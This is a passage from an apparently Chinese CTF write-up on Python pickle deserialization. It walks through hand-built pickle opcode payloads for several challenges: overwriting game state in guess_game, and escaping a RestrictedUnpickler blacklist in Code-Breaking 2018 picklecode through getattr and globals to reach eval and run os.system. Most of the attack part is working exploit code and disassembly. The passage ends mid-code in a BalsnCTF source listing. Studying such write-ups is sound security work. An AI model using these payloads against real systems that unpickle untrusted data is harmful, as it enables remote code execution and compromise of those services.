class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self</span>):</span><br>        number = randint(<span class="hljs-number">0</span>, number_range)<br>        self.curr_ticket = Ticket(number)<br>        self.round_count = <span class="hljs-number">0</span><br>        self.win_count = <span class="hljs-number">0</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">next_game</span>(<span class="hljs-params">self, ticket</span>):</span><br>        win = <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">if</span> self.curr_ticket == ticket:<br>            self.win_count += <span class="hljs-number">1</span><br>            win = <span class="hljs-literal">True</span><br><br>        number = randint(<span class="hljs-number">0</span>, number_range)<br>        self.curr_ticket = Ticket(number)<br>        self.round_count += <span class="hljs-number">1</span><br><br>        <span class="hljs-keyword">return</span> win<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">finished</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-keyword">return</span> self.round_count &gt;= max_round<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">is_win</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-keyword">return</span> self.win_count == max_round<br></code></pre></td></tr></table></figure><p>就是要胜利次数==最大轮数，而最大轮数是10，所以就是要全胜，所以我们可以利用变量覆盖，所以可以：</p><ul><li>让win_count=10,round_count=9传输一次。</li><li>直接修改对象的值<code>curr_ticket</code>，让其与传过去的值相等</li><li>执行命令直接读取/flag</li></ul><ol><li>官方exp：</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> struct<br><br>s = socket.socket()<br>s.connect((<span class="hljs-string">&#x27;node2.buuoj.cn.wetolink.com&#x27;</span>, <span class="hljs-number">28049</span>))<br><br>exp = b<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27;cguess_game</span><br><span class="hljs-string">game</span><br><span class="hljs-string">&#125;S&quot;win_count&quot;</span><br><span class="hljs-string">I10</span><br><span class="hljs-string">sS&quot;round_count&quot;</span><br><span class="hljs-string">I9</span><br><span class="hljs-string">sbcguess_game.Ticket\nTicket\nq\x00)\x81q\x01&#125;q\x02X\x06\x00\x00\x00numberq\x03K\xffsb.&#x27;</span><span class="hljs-string">&#x27;&#x27;</span><br><br>s.send(struct.pack(<span class="hljs-string">&#x27;&gt;I&#x27;</span>, len(exp)))<br>s.send(exp)<br><br>print(s.recv(<span class="hljs-number">1024</span>))<br>print(s.recv(<span class="hljs-number">1024</span>))<br>print(s.recv(<span class="hljs-number">1024</span>))<br>print(s.recv(<span class="hljs-number">1024</span>))<br></code></pre></td></tr></table></figure><p>解释如下：</p><p><code>pickle</code>本质是个栈语言, 不同于 json 亦或是 php 的 serialize. 实际上是运行 pickle 得到的结果是被序列化的对象. 这里虽然条件受限, 只能加载指定模块, 但是可以看到 <code>__init.py__</code> 中 <code>game = Game()</code>, 所以只要构造出 pickle 代码获得 guess_game.game, 然后修改 game 的 win_count 和 round_count 即可.<br>注意这里必须手写, 如果是 <code>from guess_game import game</code>, 然后修改再 dumps 这个 game 的话, 是在运行时重新新建一个 Game 对象, 而不是从 guess_game 这个 module 里面获取.</p><p>然后注意</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">ticket = restricted_loads(ticket)<br><br><span class="hljs-keyword">assert</span> <span class="hljs-built_in">type</span>(ticket) == Ticket<br></code></pre></td></tr></table></figure><p>所以还需要栈顶为一个 Ticket, 这比较方便, 可以 dumps 一个 Ticket 拼到之前手写的后面就可以了.</p><p><code>ref: https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html</code></p><p>梳理<code>opcode</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> pickletools<br>&gt;&gt;&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>exp = <span class="hljs-string">b&#x27;&#x27;&#x27;cguess_game</span><br><span class="hljs-string"><span class="hljs-meta">... </span>game</span><br><span class="hljs-string"><span class="hljs-meta">... </span>&#125;S&quot;win_count&quot;</span><br><span class="hljs-string"><span class="hljs-meta">... </span>I10</span><br><span class="hljs-string"><span class="hljs-meta">... </span>sS&quot;round_count&quot;</span><br><span class="hljs-string"><span class="hljs-meta">... </span>I9</span><br><span class="hljs-string"><span class="hljs-meta">... </span>sb&#x27;&#x27;&#x27;</span><br>&gt;&gt;&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>x = pickletools.dis(exp)<br>    <span class="hljs-number">0</span>: c    GLOBAL     <span class="hljs-comment">#&#x27;guess_game game&#x27;   引入包guess_game.game</span><br>   <span class="hljs-number">17</span>: &#125;    EMPTY_DICT   <span class="hljs-comment">#往栈中压入一个空字典</span><br>   <span class="hljs-number">18</span>: S    STRING     <span class="hljs-string">&#x27;win_count&#x27;</span>   <span class="hljs-comment">#实例化字符串对象win_count</span><br>   <span class="hljs-number">31</span>: I    INT        <span class="hljs-number">10</span>   <span class="hljs-comment">#实例化int对象10</span><br>   <span class="hljs-number">35</span>: s    SETITEM   <span class="hljs-comment">#将栈的第一个和第二个对象作为key-value对，添加或更新到栈的第三个对象，即&#123;&#x27;win_count&#x27;:&#x27;10&#x27;&#125;</span><br>   <span class="hljs-number">36</span>: S    STRING     <span class="hljs-string">&#x27;round_count&#x27;</span>   <span class="hljs-comment">#实例化字符串对象round_count</span><br>   <span class="hljs-number">51</span>: I    INT        <span class="hljs-number">9</span>   <span class="hljs-comment">#实例化int对象9</span><br>   <span class="hljs-number">54</span>: s    SETITEM   <span class="hljs-comment">#将栈的第一个和第二个对象作为key-value对，添加或更新到栈的第三个对象，即&#123;&#x27;round_count&#x27;:&#x27;9&#x27;&#125;</span><br>   <span class="hljs-number">55</span>: b    BUILD   <span class="hljs-comment">#调用__setstate__ 或者 __dict__.update() dict.update:更新对象的属性的</span><br></code></pre></td></tr></table></figure><p>但是还有个验证，assert type(ticket) == Ticket。</p><p>因为<code>pickle</code>序列流执行完后将会把栈顶的值返回，那结尾再留一个<code>Ticket</code>的对象就好了。</p><p>所以完整<code>opcode</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">b&#x27;&#x27;&#x27;cguess_game</span><br><span class="hljs-string">game</span><br><span class="hljs-string">&#125;S&quot;win_count&quot;</span><br><span class="hljs-string">I10</span><br><span class="hljs-string">sS&quot;round_count&quot;</span><br><span class="hljs-string">I9</span><br><span class="hljs-string">sbcguess_game.Ticket\nTicket\nq\x00)\x81q\x01&#125;q\x02X\x06\x00\x00\x00numberq\x03K\xffsb.&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><ol start="2"><li><p>尝试覆盖掉<code>current_ticket</code>：</p><p><code>opcode</code>如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">b&quot;cguess_game\ngame\nN(S&#x27;curr_ticket&#x27;\ncguess_game.Ticket\nTicket\n)\x81&#125;X\x06\x00\x00\x00numberK\x06sbd\x86bcguess_game.Ticket\nTicket\n)\x81&#125;X\x06\x00\x00\x00numberK\x06sb.&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> pickletools<br>&gt;&gt;&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>exp = <span class="hljs-string">b&quot;cguess_game\ngame\nN(S&#x27;curr_ticket&#x27;\ncguess_game.Ticket\nTicket\n)\x81&#125;X\x06\x00\x00\x00numberK\x06sbd\x86bcguess_game.Ticket\nTicket\n)\x81&#125;X\x06\x00\x00\x00numberK\x06sb.&quot;</span><br>&gt;&gt;&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>pickletools.dis(exp)<br>    <span class="hljs-number">0</span>: c    GLOBAL     <span class="hljs-string">&#x27;guess_game game&#x27;</span><br>   <span class="hljs-number">17</span>: N    NONE<br>   <span class="hljs-number">18</span>: (    MARK<br>   <span class="hljs-number">19</span>: S        STRING     <span class="hljs-string">&#x27;curr_ticket&#x27;</span><br>   <span class="hljs-number">34</span>: c        GLOBAL     <span class="hljs-string">&#x27;guess_game.Ticket Ticket&#x27;</span><br>   <span class="hljs-number">60</span>: )        EMPTY_TUPLE<br>   <span class="hljs-number">61</span>: \x81     NEWOBJ<br>   <span class="hljs-number">62</span>: &#125;        EMPTY_DICT<br>   <span class="hljs-number">63</span>: X        BINUNICODE <span class="hljs-string">&#x27;number&#x27;</span><br>   <span class="hljs-number">74</span>: K        BININT1    <span class="hljs-number">6</span><br>   <span class="hljs-number">76</span>: s        SETITEM<br>   <span class="hljs-number">77</span>: b        BUILD<br>   <span class="hljs-number">78</span>: d        DICT       (MARK at <span class="hljs-number">18</span>)<br>   <span class="hljs-number">79</span>: \x86 TUPLE2<br>   <span class="hljs-number">80</span>: b    BUILD<br>   <span class="hljs-number">81</span>: c    GLOBAL     <span class="hljs-string">&#x27;guess_game.Ticket Ticket&#x27;</span><br>  <span class="hljs-number">107</span>: )    EMPTY_TUPLE<br>  <span class="hljs-number">108</span>: \x81 NEWOBJ<br>  <span class="hljs-number">109</span>: &#125;    EMPTY_DICT<br>  <span class="hljs-number">110</span>: X    BINUNICODE <span class="hljs-string">&#x27;number&#x27;</span><br>  <span class="hljs-number">121</span>: K    BININT1    <span class="hljs-number">6</span><br>  <span class="hljs-number">123</span>: s    SETITEM<br>  <span class="hljs-number">124</span>: b    BUILD<br>  <span class="hljs-number">125</span>: .    STOP<br></code></pre></td></tr></table></figure></li></ol><h4 id="Code-Breaking-2018-picklecode"><a href="#Code-Breaking-2018-picklecode" class="headerlink" title="Code-Breaking 2018 picklecode"></a>Code-Breaking 2018 picklecode</h4><p>源码：<code>https://github.com/phith0n/code-breaking/blob/master/2018/picklecode</code></p><p>发现目标是一个<code>Django</code>项目，先查看<code>Django</code>的配置文件。目标配置文件<code>code/settings.py</code>中有如下几个值得注意的地方：</p><ul><li><code>SESSION_ENGINE = &#39;django.contrib.sessions.backends.signed_cookies&#39;</code></li><li><code>SESSION_SERIALIZER = &#39;core.serializer.PickleSerializer&#39;</code></li></ul><p>因为和默认的<code>Django</code>配置文件相比，这两处可以说是很少在实际项目中看到的。</p><p><code>SESSION_ENGINE</code>指的是<code>Django</code>使用将用户认证信息存储在哪里，<code>SESSION_SERIALIZER</code>指的是<code>Django</code>用什么方式存储用户认证信息。</p><p>一个是存储位置，一个是存储方式。可以简单理解一下，用户的<code>session</code>对象先由<code>SESSION_SERIALIZER</code>指定的方式转换成一个字符串，再由<code>SESSION_ENGINE</code>指定的方式存储到某个地方。</p><p>默认Django项目中，这两个值分别是：<code>django.contrib.sessions.backends.db</code>和<code>django.contrib.sessions.serializers.JSONSerializer</code>。看名字就知道，默认<code>Django</code>的<code>session</code>是使用<code>json</code>的形式，存储在数据库里。</p><p>其实意思就是：该目标的<code>session</code>是用pickle的形式，存储在<code>Cookie</code>中。</p><p><code>pickle</code>反序列化是可以执行任意命令的，我们要想办法控制这个值，进而获取目标系统权限。</p><p>我们的目的就是控制session，而<code>session engine</code>是<code>django.contrib.sessions.backends.signed_cookies</code>，也就是说这个<code>session</code>是签名（signed）后存储在<code>Cookie</code>中的，我们唯一不知道的就是签名时使用的密钥。</p><p>打开<code>core.serializer.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> io<br><span class="hljs-keyword">import</span> builtins<br><br>__all__ = (<span class="hljs-string">&#x27;PickleSerializer&#x27;</span>, )<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RestrictedUnpickler</span>(<span class="hljs-params">pickle.Unpickler</span>):</span><br>    blacklist = &#123;<span class="hljs-string">&#x27;eval&#x27;</span>, <span class="hljs-string">&#x27;exec&#x27;</span>, <span class="hljs-string">&#x27;execfile&#x27;</span>, <span class="hljs-string">&#x27;compile&#x27;</span>, <span class="hljs-string">&#x27;open&#x27;</span>, <span class="hljs-string">&#x27;input&#x27;</span>, <span class="hljs-string">&#x27;__import__&#x27;</span>, <span class="hljs-string">&#x27;exit&#x27;</span>&#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">find_class</span>(<span class="hljs-params">self, module, name</span>):</span><br>        <span class="hljs-comment"># Only allow safe classes from builtins.</span><br>        <span class="hljs-keyword">if</span> module == <span class="hljs-string">&quot;builtins&quot;</span> <span class="hljs-keyword">and</span> name <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> self.blacklist:<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">getattr</span>(builtins, name)<br>        <span class="hljs-comment"># Forbid everything else.</span><br>        <span class="hljs-keyword">raise</span> pickle.UnpicklingError(<span class="hljs-string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> %<br>                                     (module, name))<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PickleSerializer</span>():</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dumps</span>(<span class="hljs-params">self, obj</span>):</span><br>        <span class="hljs-keyword">return</span> pickle.dumps(obj)<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">loads</span>(<span class="hljs-params">self, data</span>):</span><br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(data, <span class="hljs-built_in">str</span>):<br>                <span class="hljs-keyword">raise</span> TypeError(<span class="hljs-string">&quot;Can&#x27;t load pickle from unicode string&quot;</span>)<br>            file = io.BytesIO(data)<br>            <span class="hljs-keyword">return</span> RestrictedUnpickler(file,<br>                              encoding=<span class="hljs-string">&#x27;ASCII&#x27;</span>, errors=<span class="hljs-string">&#x27;strict&#x27;</span>).load()<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-keyword">return</span> &#123;&#125;<br></code></pre></td></tr></table></figure><p>这里使用了<code>RestrictedUnpickler</code>这个类作为序列化时使用的过程类。其实就是我们可以自定义<code>RestrictedUnpickler</code>这个类给反序列化设置黑白名单，进而限制这个功能被滥用：</p><p><img src="https://woshilnp.github.io/wzimg/115.png" alt="a"></p><p><code>find_class</code>中限制了反序列化的对象必须是<code>builtins</code>模块中的对象，但不能是<code>&#123;&#39;eval&#39;, &#39;exec&#39;, &#39;execfile&#39;, &#39;compile&#39;, &#39;open&#39;, &#39;input&#39;, &#39;__import__&#39;, &#39;exit&#39;&#125;</code>。</p><p>例如我们去执行<code>os.system</code>，而<code>find_class</code>中限制module必须是<code>builtins</code>，自然就被拦截了。</p><p><img src="https://woshilnp.github.io/wzimg/116.png" alt="a"></p><p><code>builtins</code>模块在Python中实际上就是不需要import就能使用的模块，比如常见的<code>open</code>、<code>__import__</code>、<code>eval</code>、<code>input</code>这种内置函数，都属于<code>builtins</code>模块。</p><p>但这些函数已经被禁用了：</p><ul><li>eval</li><li>exec</li><li>execfile</li><li>compile</li><li>open</li><li>input</li><li><code>__import__</code></li><li>exit</li></ul><p>但是没有过滤<code>getattr</code>函数，我们可以通过<code>builtins.getattr(&#39;builtins&#39;, &#39;eval&#39;)</code>来获取eval函数，然后再执行即可。此时，<code>find_class</code>获得的module是<code>builtins</code>，name是<code>getattr</code>，在允许的范围中，不会被沙盒拦截。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">getattr</span>(<span class="hljs-built_in">globals</span>()[<span class="hljs-string">&#x27;__builtins__&#x27;</span>],<span class="hljs-string">&#x27;eval&#x27;</span>)<br>&lt;built-<span class="hljs-keyword">in</span> function <span class="hljs-built_in">eval</span>&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">getattr</span>(<span class="hljs-built_in">dict</span>.get(<span class="hljs-built_in">globals</span>(), <span class="hljs-string">&#x27;__builtins__&#x27;</span>), <span class="hljs-string">&#x27;eval&#x27;</span>)<br>&lt;built-<span class="hljs-keyword">in</span> function <span class="hljs-built_in">eval</span>&gt;<br></code></pre></td></tr></table></figure><p><code>getattr</code>和<code>globals</code>并没有被禁，那么手搓<code>opcode</code></p><p>首先使用<code>c</code>，获取<code>getattr</code>这个可执行对象：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">cbuiltins<br><span class="hljs-built_in">getattr</span><br></code></pre></td></tr></table></figure><p>然后我们需要获取当前上下文，Python中使用<code>globals()</code>获取上下文，所以我们要获取<code>builtins.globals</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">cbuiltins<br><span class="hljs-built_in">globals</span><br></code></pre></td></tr></table></figure><p>Python中globals是个字典，我们需要取字典中的某个值，所以还要获取<code>dict</code>这个对象：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">cbuiltins<br><span class="hljs-built_in">dict</span><br></code></pre></td></tr></table></figure><p>现在执行<code>globals()</code>函数，获取完整上下文：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">cbuiltins<br><span class="hljs-built_in">globals</span><br>(tR<br></code></pre></td></tr></table></figure><p>栈顶元素是<code>builtins.globals</code>，我们只需要再压入一个空元组<code>(t</code>，然后使用<code>R</code>执行即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">cbuiltins<br><span class="hljs-built_in">getattr</span><br>(cbuiltins<br><span class="hljs-built_in">dict</span><br>S<span class="hljs-string">&#x27;get&#x27;</span><br>tR(cbuiltins<br><span class="hljs-built_in">globals</span><br>(tRS<span class="hljs-string">&#x27;builtins&#x27;</span><br>tRp1<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">0</span>: c    GLOBAL     <span class="hljs-string">&#x27;builtins getattr&#x27;</span>   <span class="hljs-comment">#引入模块builtins.getattr</span><br>   <span class="hljs-number">18</span>: (    MARK   <span class="hljs-comment">#向栈中压入一个MARK标记,即空的()</span><br>   <span class="hljs-number">19</span>: c        GLOBAL     <span class="hljs-string">&#x27;builtins dict&#x27;</span>   <span class="hljs-comment">#引入builtins.dict</span><br>   <span class="hljs-number">34</span>: S        STRING     <span class="hljs-string">&#x27;get&#x27;</span>   <span class="hljs-comment">#实例化字符串对象get</span><br>   <span class="hljs-number">41</span>: t        TUPLE      (MARK at <span class="hljs-number">18</span>)   <span class="hljs-comment">#寻找栈中的上一个MARK，并组合之间的数据为元组</span><br>   <span class="hljs-number">42</span>: R    REDUCE   <span class="hljs-comment">#选择栈上的第一个对象(即get)作为函数、第二个对象作为参数（第二个对象必须为元组）(即())，然后调用该函数</span><br>   <span class="hljs-number">43</span>: (    MARK   <span class="hljs-comment">#向栈中压入一个MARK标记,即空的()</span><br>   <span class="hljs-number">44</span>: c        GLOBAL     <span class="hljs-string">&#x27;builtins globals&#x27;</span><span class="hljs-comment">#引入模块builtins.globals</span><br>   <span class="hljs-number">62</span>: (        MARK   <span class="hljs-comment">#向栈中压入一个MARK标记,即空的()</span><br>   <span class="hljs-number">63</span>: t            TUPLE      (MARK at <span class="hljs-number">62</span>)   <span class="hljs-comment">#寻找栈中的上一个MARK，并组合之间的数据为元组</span><br>   <span class="hljs-number">64</span>: R        REDUCE   <span class="hljs-comment">#选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数</span><br>   <span class="hljs-number">65</span>: S        STRING     <span class="hljs-string">&#x27;builtins&#x27;</span>   <span class="hljs-comment">#实例化字符串对象builtins</span><br>   <span class="hljs-number">77</span>: t        TUPLE      (MARK at <span class="hljs-number">43</span>)   <span class="hljs-comment">#寻找栈中的上一个MARK，并组合之间的数据为元组</span><br>   <span class="hljs-number">78</span>: R    REDUCE   <span class="hljs-comment">#选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数</span><br>   <span class="hljs-number">79</span>: p    PUT        <span class="hljs-number">1</span>   <span class="hljs-comment">#将栈顶对象储存至memo_1</span><br></code></pre></td></tr></table></figure><p>即得到<code>builtins.getattr(dict.get(globals(),__builtins__))</code>，即<code>builtins</code>对象</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> pickle<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> builtins<br>&gt;&gt;&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>data = <span class="hljs-string">b&#x27;&#x27;&#x27;cbuiltins</span><br><span class="hljs-string"><span class="hljs-meta">... </span>getattr</span><br><span class="hljs-string"><span class="hljs-meta">... </span>(cbuiltins</span><br><span class="hljs-string"><span class="hljs-meta">... </span>dict</span><br><span class="hljs-string"><span class="hljs-meta">... </span>S&#x27;get&#x27;</span><br><span class="hljs-string"><span class="hljs-meta">... </span>tR(cbuiltins</span><br><span class="hljs-string"><span class="hljs-meta">... </span>globals</span><br><span class="hljs-string"><span class="hljs-meta">... </span>(tRS&#x27;builtins&#x27;</span><br><span class="hljs-string"><span class="hljs-meta">... </span>tRp1</span><br><span class="hljs-string"><span class="hljs-meta">... </span>.&#x27;&#x27;&#x27;</span><br>&gt;&gt;&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>data = pickle.loads(data)<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">print</span>(data)<br>&lt;module <span class="hljs-string">&#x27;builtins&#x27;</span> (built-<span class="hljs-keyword">in</span>)&gt;<br></code></pre></td></tr></table></figure><p>接下来，只需要再从这个没有限制的<code>builtins</code>对象中拿到<code>eval</code>等真正危险的函数即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">cbuiltins<br><span class="hljs-built_in">getattr</span><br>(cbuiltins<br><span class="hljs-built_in">dict</span><br>S<span class="hljs-string">&#x27;get&#x27;</span><br>tR(cbuiltins<br><span class="hljs-built_in">globals</span><br>(tRS<span class="hljs-string">&#x27;builtins&#x27;</span><br>tRp1<br>cbuiltins<br><span class="hljs-built_in">getattr</span><br>(g1<br>S<span class="hljs-string">&#x27;eval&#x27;</span><br>tR(S<span class="hljs-string">&#x27;__import__(&quot;os&quot;).system(&quot;id&quot;)&#x27;</span><br>tR.<br><br></code></pre></td></tr></table></figure><p><img src="https://woshilnp.github.io/wzimg/117.png" alt="a"></p><h4 id="BalsnCTF-2019-Pyshv1"><a href="#BalsnCTF-2019-Pyshv1" class="headerlink" title="BalsnCTF 2019 Pyshv1"></a>BalsnCTF 2019 Pyshv1</h4><p>securePickle.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> io<br><br><br>whitelist = []<br><br><br><span class="hljs-comment"># See https://docs.python.org/3.7/library/pickle.html#restricting-globals</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RestrictedUnpickler</span>(<span class="hljs-params">pickle.Unpickler</span>):</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">find_class</span>(<span class="hljs-params">self, module, name</span>):</span><br>        <span class="hljs-keyword">if</span> module <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> whitelist <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;.&#x27;</span> <span class="hljs-keyword">in</span> name:<br>            <span class="hljs-keyword">raise</span> KeyError(<span class="hljs-string">&#x27;The pickle is spoilt :(&#x27;</span>)<br>        <span class="hljs-keyword">return</span> pickle.Unpickler.find_class(self, module, name)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">loads</span>(<span class="hljs-params">s</span>):</span><br>    <span class="hljs-string">&quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()<br><br><br>dumps = pickle.dumps<br></code></pre></td></tr></table></figure><p>server.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 